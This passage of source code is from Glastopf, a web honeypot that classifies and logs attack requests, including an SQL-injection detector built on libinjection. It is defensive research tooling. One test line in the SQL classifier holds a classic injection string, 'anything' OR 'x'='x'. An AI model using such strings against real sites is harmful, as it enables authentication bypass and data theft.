__FILENAME__ = conf
# -*- coding: utf-8 -*-
#
# Glastopf documentation build configuration file, created by
# sphinx-quickstart on Thu Nov 29 11:48:58 2012.
#
# This file is execfile()d with the current directory set to its containing dir.
#
# Note that not all possible configuration values are present in this
# autogenerated file.
#
# All configuration values have a default; values that are commented out
# serve to show the default.

import sys, os
sys.path.append(os.path.join(os.path.dirname(__file__)))
import glastopf_version

# If extensions (or modules to document with autodoc) are in another directory,
# add these directories to sys.path here. If the directory is relative to the
# documentation root, use os.path.abspath to make it absolute, like shown here.
#sys.path.insert(0, os.path.abspath('.'))

# -- General configuration -----------------------------------------------------

# If your documentation needs a minimal Sphinx version, state it here.
#needs_sphinx = '1.0'

# Add any Sphinx extension module names here, as strings. They can be extensions
# coming with Sphinx (named 'sphinx.ext.*') or your custom ones.
extensions = ['sphinx.ext.pngmath', 'sphinx.ext.viewcode']

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The encoding of source files.
#source_encoding = 'utf-8-sig'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = u'Glastopf'
copyright = u'2014, Glastopf Project'

# The version info for the project you're documenting, acts as replacement for
# |version| and |release|, also used in various other places throughout the
# built documents.
#
# The short X.Y version.
version = glastopf_version.__version__
# The full version, including alpha/beta/rc tags.
release = glastopf_version.__version__

# The language for content autogenerated by Sphinx. Refer to documentation
# for a list of supported languages.
#language = None

# There are two options for replacing |today|: either, you set today to some
# non-false value, then it is used:
#today = ''
# Else, today_fmt is used as the format for a strftime call.
#today_fmt = '%B %d, %Y'

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = []

# The reST default role (used for this markup: `text`) to use for all documents.
#default_role = None

# If true, '()' will be appended to :func: etc. cross-reference text.
#add_function_parentheses = True

# If true, the current module name will be prepended to all description
# unit titles (such as .. function::).
#add_module_names = True

# If true, sectionauthor and moduleauthor directives will be shown in the
# output. They are ignored by default.
#show_authors = False

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# A list of ignored prefixes for module index sorting.
#modindex_common_prefix = []


# -- Options for HTML output ---------------------------------------------------

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Theme options are theme-specific and customize the look and feel of a theme
# further.  For a list of options available for each theme, see the
# documentation.
#html_theme_options = {}

# Add any paths that contain custom themes here, relative to this directory.
#html_theme_path = []

# The name for this set of Sphinx documents.  If None, it defaults to
# "<project> v<release> documentation".
#html_title = None

# A shorter title for the navigation bar.  Default is the same as html_title.
#html_short_title = None

# The name of an image file (relative to this directory) to place at the top
# of the sidebar.
#html_logo = None

# The name of an image file (within the static path) to use as favicon of the
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32
# pixels large.
#html_favicon = None

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,
# using the given strftime format.
#html_last_updated_fmt = '%b %d, %Y'

# If true, SmartyPants will be used to convert quotes and dashes to
# typographically correct entities.
#html_use_smartypants = True

# Custom sidebar templates, maps document names to template names.
#html_sidebars = {}

# Additional templates that should be rendered to pages, maps page names to
# template names.
#html_additional_pages = {}

# If false, no module index is generated.
#html_domain_indices = True

# If false, no index is generated.
#html_use_index = True

# If true, the index is split into individual pages for each letter.
#html_split_index = False

# If true, links to the reST sources are added to the pages.
#html_show_sourcelink = True

# If true, "Created using Sphinx" is shown in the HTML footer. Default is True.
#html_show_sphinx = True

# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True.
#html_show_copyright = True

# If true, an OpenSearch description file will be output, and all pages will
# contain a <link> tag referring to it.  The value of this option must be the
# base URL from which the finished HTML is served.
#html_use_opensearch = ''

# This is the file name suffix for HTML files (e.g. ".xhtml").
#html_file_suffix = None

# Output file base name for HTML help builder.
htmlhelp_basename = 'Glastopfdoc'


# -- Options for LaTeX output --------------------------------------------------

latex_elements = {
# The paper size ('letterpaper' or 'a4paper').
#'papersize': 'letterpaper',

# The font size ('10pt', '11pt' or '12pt').
#'pointsize': '10pt',

# Additional stuff for the LaTeX preamble.
#'preamble': '',
}

# Grouping the document tree into LaTeX files. List of tuples
# (source start file, target name, title, author, documentclass [howto/manual]).
latex_documents = [
  ('index', 'Glastopf.tex', u'Glastopf Documentation',
   u'Glastopf Project', 'manual'),
]

# The name of an image file (relative to this directory) to place at the top of
# the title page.
#latex_logo = None

# For "manual" documents, if this is true, then toplevel headings are parts,
# not chapters.
#latex_use_parts = False

# If true, show page references after internal links.
#latex_show_pagerefs = False

# If true, show URL addresses after external links.
#latex_show_urls = False

# Documents to append as an appendix to all manuals.
#latex_appendices = []

# If false, no module index is generated.
#latex_domain_indices = True


# -- Options for manual page output --------------------------------------------

# One entry per manual page. List of tuples
# (source start file, name, description, authors, manual section).
man_pages = [
    ('index', 'glastopf', u'Glastopf Documentation',
     [u'Glastopf Project'], 1)
]

# If true, show URL addresses after external links.
#man_show_urls = False


# -- Options for Texinfo output ------------------------------------------------

# Grouping the document tree into Texinfo files. List of tuples
# (source start file, target name, title, author,
#  dir menu entry, description, category)
texinfo_documents = [
  ('index', 'Glastopf', u'Glastopf Documentation',
   u'Glastopf Project', 'Glastopf', 'One line description of project.',
   'Miscellaneous'),
]

# Documents to append as an appendix to all manuals.
#texinfo_appendices = []

# If false, no module index is generated.
#texinfo_domain_indices = True

# How to display URL addresses: 'footnote', 'no', or 'inline'.
#texinfo_show_urls = 'footnote'


# -- Options for Epub output ---------------------------------------------------

# Bibliographic Dublin Core info.
epub_title = u'Glastopf'
epub_author = u'Glastopf Project'
epub_publisher = u'Glastopf Project'
epub_copyright = u'2014, Glastopf Project'

# The language of the text. It defaults to the language option
# or en if the language is not set.
#epub_language = ''

# The scheme of the identifier. Typical schemes are ISBN or URL.
#epub_scheme = ''

# The unique identifier of the text. This can be a ISBN number
# or the project homepage.
#epub_identifier = ''

# A unique identification for the text.
#epub_uid = ''

# A tuple containing the cover image and cover page html template filenames.
#epub_cover = ()

# HTML files that should be inserted before the pages created by sphinx.
# The format is a list of tuples containing the path and title.
#epub_pre_files = []

# HTML files shat should be inserted after the pages created by sphinx.
# The format is a list of tuples containing the path and title.
#epub_post_files = []

# A list of files that should not be packed into the epub file.
#epub_exclude_files = []

# The depth of the table of contents in toc.ncx.
#epub_tocdepth = 3

# Allow duplicate toc entries.
#epub_tocdup = True

########NEW FILE########
__FILENAME__ = glastopf_version
__version__ = '3.1.1'
########NEW FILE########
__FILENAME__ = glastopf
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

# TODO: Properly implement gevent in glastopf
from gevent import monkey
monkey.patch_all()

import gevent
import os
import sys
import Queue
import string
import random

from ConfigParser import ConfigParser
import logging.handlers

from __init__ import __version__
from modules.HTTP.handler import HTTPHandler
import modules.HTTP.method_handler as method_handler
import modules.events.attack as attack
from modules.handlers.request_handler import RequestHandler
from modules import logging_handler, vdocs
import shutil
import modules.privileges as privileges
#import modules.processing.profiler as profiler
from modules.handlers.emulators.dork_list import dork_file_processor
from modules.handlers.emulators.dork_list import database_sqla
from modules.handlers.emulators.dork_list import database_mongo
from modules.handlers.emulators.dork_list import dork_page_generator
from modules.handlers.emulators.dork_list import mnem_service
from modules.reporting.main import log_mongodb, log_sql
from subprocess import check_call
from sqlalchemy import create_engine


logger = logging.getLogger(__name__)
package_directory = os.path.dirname(os.path.abspath(__file__))


class GlastopfHoneypot(object):
    def __init__(self, config="glastopf.cfg", work_dir=os.getcwd()):
        """
        :param work_dir: directory used for data storage and various data files, must be writeable by glastopf.
            Default: os.getcwd()
        :param config: path to the glastopf configuration file.
            Default: glastopf.cfg
        """
        logger.info('Initializing Glastopf {0} using "{1}" as work directory.'.format(__version__, work_dir))
        self.work_dir = work_dir
        self.data_dir = os.path.join(self.work_dir, 'data')

        conf_parser = ConfigParser()
        conf_parser.read(config)
        self.options = {
            "uid": conf_parser.get("webserver", "uid").encode('latin1'),
            "gid": conf_parser.get("webserver", "gid").encode('latin1'),
            "proxy_enabled": conf_parser.get("webserver", "proxy_enabled").encode('latin1'),
            "banner": conf_parser.get("misc", "banner").encode('latin1'),
        }

        (self.maindb, self.dorkdb) = self.setup_main_database(conf_parser)

        self.dork_generator = self.setup_dork_generator(conf_parser, self.work_dir)

        if len(self.dork_generator.get_current_pages()) == 0:
            logger.info("Generating initial dork pages - this can take a while.")
            self.dork_generator.regular_generate_dork(0)

        #profiler disabled until issue #26 is fixed
        self.profiler_available = False
        if self.profiler_available:
            self.profiler = profiler.Profiler(self.maindb)

        #self.HTTP_parser = util.HTTPParser()
        self.MethodHandlers = method_handler.HTTPMethods(self.data_dir)

        #used for post processing (logging and analysis) of attack events
        self.post_queue = Queue.Queue()
        self.workers_enabled = False

    def start_background_workers(self):
        """
        Starts background threads responsible for data processing and logging.
        """
        privileges.drop(self.work_dir, self.options['uid'], self.options['gid'])
        self.workers_enabled = True
        self.loggers = logging_handler.get_aux_loggers(self.data_dir)

        dork_worker = gevent.spawn(self.dork_generator.regular_generate_dork, 30)

        post_processor_worker = gevent.spawn(self.post_processer)
        logger.info('Glastopf started and privileges dropped.')

        return [dork_worker, post_processor_worker]

    def stop_background_workers(self):
        """
        Notifies background threads that they are supposed to stop.
        This method does not guarantee that the threads actually stops.
        """
        logger.info('Stopping Glastopf.')
        self.dork_generator.enabled = False
        self.workers_enabled = False

    def post_processer(self):
        while self.workers_enabled:
            attack_event = self.post_queue.get()
            self.dork_generator.collect_dork(attack_event)

            if self.maindb:
                self.maindb.insert(attack_event)

            for _logger in self.loggers:
                try:
                    _logger.insert(attack_event)
                except Exception as ex:
                    logger.exception('Error while logging using {0}: {1}'.format(_logger, ex))

    def setup_dork_generator(self, conf_parser, work_dir):
        file_processor = dork_file_processor.DorkFileProcessor(self.dorkdb)

        mnemosyne_service = None
        if conf_parser.has_option('dork-db', 'mnem_service'):
            if conf_parser.getboolean('dork-db', 'mnem_service'):
                mnemosyne_service = mnem_service.Mnem_Service()

        return dork_page_generator.DorkPageGenerator(self.dorkdb,
                                                     file_processor,
                                                     data_dir=self.data_dir,
                                                     mnem_service_instance=mnemosyne_service)

    def setup_main_database(self, conf_parser):

        if conf_parser.getboolean("main-database", "enabled"):
            connection_string = conf_parser.get("main-database", "connection_string")
            logger.info("Connecting to main database with: {0}".format(connection_string))
            if connection_string.startswith("mongodb://"):
                maindb = log_mongodb.Database(connection_string)
                dorkdb = database_mongo.Database(connection_string)
                return maindb, dorkdb
            elif connection_string.startswith(("sqlite", "mysql",
                                               "oracle", "postgresql")):
                sqla_engine = create_engine(connection_string)
                maindb = log_sql.Database(sqla_engine)
                dorkdb = database_sqla.Database(sqla_engine)
                return maindb, dorkdb
            else:
                logger.error("Invalid connection string.")
                sys.exit(1)
        else:
            default_db = "sqlite://db/glastopf.db"
            logger.info("Main datbase has been disabled, dorks will be stored in: {0}".format(default_db))
            #db will only be used for dorks
            sqla_engine = create_engine("sqlite://db/glastopf.db")
            maindb = log_sql.Database(sqla_engine)
            dorkdb = database_sqla.Database(sqla_engine)
            #disable usage of main logging datbase
            return None, dorkdb

    @staticmethod
    def prepare_sandbox(work_dir):
        logger.info('Creating PHP sandbox')
        #create sandbox
        sandbox_dir = os.path.join(package_directory, 'sandbox')
        #preserve old working dir
        old_cwd = os.getcwd()
        os.chdir(sandbox_dir)
        #execute makefile and output to self.workdir/data/apd_sandbox.php
        sandbox_out = os.path.join(work_dir, 'data', 'sandbox.php')
        check_call(['make', '-B', '-s', 'out={0}'.format(sandbox_out)])
        #restore state of original working dir
        os.chdir(old_cwd)

    @staticmethod
    def prepare_environment(work_dir):
        """
        Configures the Glastopf work environment.

        If this methods completes without exceptions, the environment will look something like:
        (self.workdir)/
                      glastopf.cfg
                      db/
                      log/
                      data/
                          sandbox.php
                          dork_pages/
                          virtual_docs/
                          (and various other module data directories)
        """
        logger.info('Preparing work environment.')
        if not os.path.isfile(os.path.join(work_dir, 'glastopf.cfg')):
            logger.info('Copying glastopf.cfg to work work_dir.')
            shutil.copyfile(os.path.join(package_directory, 'glastopf.cfg.dist'),
                            os.path.join(work_dir, 'glastopf.cfg'))

        #copy emulator level data
        emulator_data_dir = os.path.join(package_directory, 'modules/handlers/emulators/data/')

        shutil.copytree(emulator_data_dir, os.path.join(work_dir, 'data/'),
                        ignore=GlastopfHoneypot._ignore_copy_files)

        dirs = ('log', 'db', 'data')
        for entry in dirs:
            dir_path = os.path.join(work_dir, entry)
            if not os.path.isdir(dir_path):
                os.mkdir(dir_path)
        # Randomize the files in virtualdocs folder
        vdocs.randomize_vdocs(os.path.join(work_dir, 'data/virtualdocs/'))
        GlastopfHoneypot.prepare_sandbox(work_dir)

    @staticmethod
    def _ignore_copy_files(path, content):
        to_ignore = []
        for file_name in content:
            if file_name in ('.placeholder', '.git'):
                to_ignore.append(file_name)
        return to_ignore

    def _handle_proxy(self, attack_event, addr):
        client_ip = attack_event.http_request.request_headers['X-Forwarded-For']
        client_ip = client_ip.split(',')[-1]
        if client_ip == 'unknown':
            client_ip = '0.0.0.0'
            # Note: the port number is not relevant in this case
        attack_event.source_addr = (client_ip, addr[1])

    def handle_request(self, raw_request, addr, sensor_addr):

        attack_event = attack.AttackEvent()
        attack_event.raw_request = raw_request
        attack_event.sensor_addr = sensor_addr

        attack_event.http_request = HTTPHandler(raw_request, addr, self.options['banner'], sys_version=' ')

        if self.options["proxy_enabled"] == "True":
            self._handle_proxy(attack_event, addr)
        else:
            attack_event.source_addr = addr
        logger.info("{0} requested {1} {2} on {3}:{4}".format(
            attack_event.source_addr[0],
            attack_event.http_request.command,
            attack_event.http_request.path,
            attack_event.sensor_addr[0],
            attack_event.sensor_addr[1]))
        # Handle the HTTP request method
        attack_event.matched_pattern = getattr(
            self.MethodHandlers,
            attack_event.http_request.command,
            self.MethodHandlers.GET
        )(attack_event.http_request)
        # Handle the request with the specific vulnerability module
        request_handler = RequestHandler(os.path.join(self.work_dir, 'data/'))
        emulator = request_handler.get_handler(attack_event.matched_pattern)
        emulator.handle(attack_event)
        # Logging the event
        if self.profiler_available:
            self.profiler.handle_event(attack_event)
        self.post_queue.put(attack_event)

        header = attack_event.http_request.get_response_header()
        body = attack_event.http_request.get_response_body()
        return header, body

########NEW FILE########
__FILENAME__ = request
# Copyright (C) 2011  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import re
import os
import urlparse
import urllib2

from xml.dom.minidom import parse

import glastopf.modules.classification.sql as sql


package_directory = os.path.dirname(os.path.abspath(__file__))


class RequestPattern(object):
    def __init__(self, pattern_id, string, description, module):
        self.id = pattern_id
        self.string = string
        self.description = description
        self.module = module


class Classifier(object):
    # FIXME: Error handling for errors in the xml file

    def __init__(self, data_dir=os.path.join(os.getcwd(), 'data')):
        # TODO: check if file exists
        #ugly but it works...
        requests_file = os.path.join(package_directory, '../../requests.xml')
        self.tree = parse(requests_file)
        self.server_files_path = os.path.join(data_dir, 'server_files')
        if not os.path.isdir(self.server_files_path):
            os.mkdir(self.server_files_path, 0770)
        self.sqli_c = sql.SQLiClassifier()

    def get_patterns(self):
        patterns = self.tree.getElementsByTagName("request")
        return patterns

    def getText(self, nodelist):
        rc = []
        for node in nodelist:
            if node.nodeType == node.TEXT_NODE or node.nodeType == node.CDATA_SECTION_NODE:
                rc.append(node.data)
                break
        return ''.join(rc)

    def parse_pattern(self, pattern):
        pattern_id = self.getText(pattern.getElementsByTagName("id")[0].childNodes)
        pattern_string = self.getText(pattern.getElementsByTagName("patternString")[0].childNodes)
        pattern_description = pattern.getElementsByTagName("patternDescription")[0].childNodes[0].data
        pattern_module = pattern.getElementsByTagName("module")[0].childNodes[0].data
        parsed_pattern = RequestPattern(pattern_id, pattern_string,
                                        pattern_description, pattern_module)
        return parsed_pattern

    def select_pattern(self, matched_patterns):
        # TODO: add some logic
        matched_pattern = matched_patterns[0]
        if len(matched_patterns) > 1:
            if matched_patterns[0] == "unknown":
                matched_pattern = matched_patterns[1]
        else:
            matched_pattern = matched_patterns[0]
        return matched_pattern

    def file_exists(self, http_request):
        request_path = urlparse.urlparse(http_request.path).path
        requested_file = request_path.lstrip('/')
        if os.path.isfile(os.path.join(self.server_files_path, requested_file)):
            return True
        return False

    def classify_request(self, http_request):
        if self.file_exists(http_request):
            return "file_server"
        patterns = self.get_patterns()
        matched_patterns = []
        unquoted_url = urllib2.unquote(http_request.request_url)
        # SQLi early exit
        ret = self.sqli_c.classify(unquoted_url)
        if ret['sqli']:
            return "sqli"
        for pattern in patterns:
            match = None
            parsed_pattern = self.parse_pattern(pattern)
            re_pattern = re.compile(parsed_pattern.string, re.I)
            #TODO: Rules for specific method. We should add a tag in the
            # rule to identify which rule it applies.
            # And some forms would send data in GET and POST methods.
            if http_request.command == "GET":
                match = re_pattern.search(unquoted_url)
            elif http_request.command == "POST":
                match = re_pattern.search(unquoted_url)
                if match == 'unknown':
                    match = re_pattern.search(http_request.request_body)
            elif http_request.command == "HEAD":
                parsed_pattern.module = 'head'
                match = True
            elif http_request.command == "TRACE":
                parsed_pattern.module = 'trace'
                match = True
            else:
                parsed_pattern.module = 'unknown'
                match = True
            if match != None:
                matched_patterns.append(parsed_pattern.module)
        matched_pattern = self.select_pattern(matched_patterns)
        return matched_pattern

########NEW FILE########
__FILENAME__ = sql
# Copyright (C) 2013  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import difflib
import os
import json

import pylibinjection


class SQLiClassifier(object):
    """ Compares input to known queries

    Compares the input query with a set of known queries.
    Goal is to select a proper response, not to decide if malicious.
    """
    def __init__(self):
        file_dir = os.path.dirname(os.path.abspath(__file__))
        queries_file = os.path.join(file_dir, "sql_utils", "token_map.json")
        with open(queries_file, "rb") as fh:
            self.token_map = json.load(fh)

    def classify(self, string):
        return pylibinjection.detect_sqli(string)

    def _token_squence_matcher(self, query_tokens):
        """ Compares the token squence

        Libinjection tokenizes the query. We compare those tokens with our known list.
        """
        best_ratio = 0.0
        best_query = None
        for i, val in self.token_map.items():
            # Sequence comparison
            ratio = difflib.SequenceMatcher(None, query_tokens, val["libinj"]["tokens"]).ratio()
            if ratio > best_ratio:
                best_ratio = ratio
                best_query = i
            if best_ratio == 1.0:
                break
        return best_query, best_ratio

    def _query_string_match(self, payload):
        """ Compares the query string

        Compares the query string with our known list.
        This is usually less successful than the token comparison but catches corner cases.
        """
        ratio = 0.8
        queries = [query["query"].lower() for query in self.token_map.values()]
        best_matches = difflib.get_close_matches(payload, queries, 1, ratio)
        if len(best_matches) > 0:
            for i, val in self.token_map.items():
                if val["query"].lower() == best_matches[0]:
                    return i, ratio
        return None, None

    def query_similarity(self, query_tokens, payload):
        best_query, best_ratio = self._query_string_match(payload)
        if best_query is None:
            best_query, best_ratio = self._token_squence_matcher(query_tokens)
        return best_query, best_ratio


if __name__ == "__main__":
    sqli_c = SQLiClassifier()
    query = "anything' OR 'x'='x';"
    data = sqli_c.classify(query)
    print data
    best_query, best_ratio = sqli_c.query_similarity(data["fingerprint"], query.lower())
    print sqli_c.token_map[best_query], best_ratio

########NEW FILE########
__FILENAME__ = responses
# Copyright (C) 2013  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from xml.etree import ElementTree
import os


class Response(object):
    def __init__(self, r_id, desc, content):
        self.id = r_id
        self.desc = desc
        self.content = content


class SQLResponses(object):
    """ Fetches a response from the list of responses

    The xml file provides a place to store responses.
    """
    # FIXME: Error handling for errors in the xml file
    def __init__(self):
        file_dir = os.path.dirname(os.path.abspath(__file__))
        responses_file = os.path.join(file_dir, "responses.xml")
        tree = ElementTree.parse(responses_file)
        doc = tree.getroot()
        self.xml_responses = doc.findall("response")

    def _get_responses(self):
        self.responses = []
        for xml_response in self.xml_responses:
            r_id = xml_response.find("id").text.strip()
            desc = xml_response.find("description").text.strip()
            content = xml_response.find("content").text.strip()
            response = Response(r_id, desc, content)
            self.responses.append(response)
        return self.responses

    def get_response(self, r_id):
        for response in self._get_responses():
            if response.id == r_id:
                return response
        for response in self._get_responses():
            if response.id == "mysql_error":
                return response

########NEW FILE########
__FILENAME__ = tokenizer
# Copyright (C) 2013  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import json
from lxml import etree

import pylibinjection


class SQLiClassifier(object):

    def __init__(self):
        pass

    def classify(self, string):
        return pylibinjection.detect_sqli(string)


if __name__ == "__main__":
    out = dict()
    sqli_c = SQLiClassifier()
    parser = etree.XMLParser()
    with open("queries.xml", "rb") as fh:
        tree = etree.fromstring(fh.read(), parser)
    i = 0
    for query in tree.xpath("/queries/query"):
        query_str = query.xpath("query")[0].text.strip().encode("UTF-8")
        db = query.xpath("database")[0].text.strip()
        try:
            resp = query.xpath("response")[0].text.strip()
        except IndexError:
            resp = None
        try:
            res = sqli_c.classify(query_str)
            out[i] = {
                "db": db,
                "query": query_str,
                "resp": resp,
                "libinj": res
            }
        except UnicodeEncodeError:
            raise
        else:
            i += 1
    with open("token_map.json", "wb") as fh:
        fh.write(json.dumps(out, indent=4))
########NEW FILE########
__FILENAME__ = attack
# Copyright (C) 2011  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from datetime import datetime
import uuid


class AttackEvent(object):
    def __init__(self):
        self.id = str(uuid.uuid4())
        self.sensor_addr = ("", "")
        self.http_request = None
        self.raw_request = None
        self.event_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.source_addr = None
        self.matched_pattern = "unknown"
        self.file_name = None

    def event_dict(self):
        event_dict = {
            "time": self.event_time,
            "source": self.source_addr,
            "request_url": self.http_request.request_url,
            "request_raw": self.http_request.request_raw,
            "pattern": self.matched_pattern,
            "filename": self.file_name,
        }
        return event_dict

########NEW FILE########
__FILENAME__ = base_emulator
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os

package_directory = os.path.dirname(os.path.abspath(__file__))


class BaseEmulator(object):
    def __init__(self, data_dir):
        self.data_dir = data_dir
        self.emulator_dir = os.path.join(package_directory, 'emulators')

    def handle(self, attack_event):
        pass

########NEW FILE########
__FILENAME__ = comments
import os
from random import choice
import codecs
from urlparse import parse_qs
from string import Template
import cgi
from glastopf.modules.handlers import base_emulator

#import glastopf.modules.processing.profiler as profiler


class CommentPoster(base_emulator.BaseEmulator):
    MAX_COMMENT_LEN = 2048
    MAX_FILE_LEN = 33816700  # ~ 3MB

    def __init__(self, data_dir):
        super(CommentPoster, self).__init__(data_dir)

    def html_escape(self, comment):
        return cgi.escape(comment)

    def handle(self, attack_event):
        # TODO: Use the unknown emulators _get_template function.
        pages_path = os.path.join(self.data_dir, 'dork_pages')
        dork_page_list = os.listdir(pages_path)
        dork_page = choice(dork_page_list)
        ip_address = attack_event.source_addr[0]

        comments_file = os.path.join(self.data_dir, 'comments.txt')

        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:
            try:
                comment = (parse_qs(attack_event.http_request.request_body)
                           ['comment'][0])
                clean_comment = self.html_escape(comment)
                clean_comment = "<br/><br/>" + clean_comment
                comment = "<br/><br/>" + comment
            except KeyError:
                comment = ""
                clean_comment = ""
            else:

                # overwrite the comments file if its size exceeds the max length
                if os.path.isfile(comments_file):
                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:
                        with codecs.open(comments_file, "w", "utf-8") as comments_txt:
                            comments_txt.write('')

                # store the comment only if its size does not exceed the max length
                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:
                    with codecs.open(comments_file, "a", "utf-8") as comments_txt:
                        comments_txt.write(clean_comment)

            if os.path.isfile(comments_file):
                with codecs.open(comments_file, "r", "utf-8") as comments_txt:
                    general_comments = comments_txt.read()
            else:
                general_comments = ''

            display_comments = str(general_comments)
            template = Template(dork_page.read())
            response = template.safe_substitute(login_msg="", comments=display_comments)
            attack_event.http_request.set_response(response)

########NEW FILE########
__FILENAME__ = database_mongo
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import re
import warnings
from datetime import datetime

import logging
logger = logging.getLogger(__name__)

try:
    from pymongo import MongoClient, uri_parser
except ImportError:
    logger.warn('Unable to import module pymongo')

class Database(object):
    """
    Responsible for all dork related communication with the glastopf mongo database.
    """

    def __init__(self, connection_string):

        uri_dict = uri_parser.parse_uri(connection_string)
        if not uri_dict['database']:
            raise Exception("Invalid Mongo URI. Database name must be specified.")

        try:
            with warnings.catch_warnings(record=True):
                self.client = MongoClient(connection_string)
            self.db = self.client[uri_dict['database']]
        except:
            logger.exception("Unable to connect to MongoDB service.")
            raise

    def select_data(self, pattern="rfi"):
        """
        Selects URLs from the events database filtered by attack module.
        """
        url_list = []

        data = self.db.events.find({'pattern': pattern})
        data = list(data.distinct('request_url'))

        self.num_distinct_results = len(data)

        for request in data:
            if request != None:
                url = request.split('=', 1)[0]
                url_list.append(url)
        return url_list

    def select_entry(self, starts_with):
        """
        Selects URL from main database filterned by name.
        """
        regx = re.compile(starts_with + ".*", re.IGNORECASE)
        urls = list(self.db.events.find({'request_url': regx}))
        return urls

    def insert_dorks(self, insert_list):
        if len(insert_list) == 0:
            return

        for item in insert_list:
            collection = item['table']
            self.db[collection].update({'content': item['content']},
                                       {'$set': {'lastime': datetime.now()},
                                        '$inc': {'count': 1}}, upsert=True)

    def get_dork_list(self, collection, starts_with=None):
        """
        Selects dork from dork collection.
        """
        if starts_with != None:
            regx = re.compile(starts_with + "^{0}".format(starts_with), re.IGNORECASE)
            dorks = list(self.db[collection].find({'content': regx},
                                                  {'content': 1, '_id': 0}))
        else:
            dorks = list(self.db[collection].find({}, {'content': 1, '_id': 0}))

        return_list = []
        for item in dorks:
            return_list.append(item['content'])

        return return_list

########NEW FILE########
__FILENAME__ = database_sqla
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
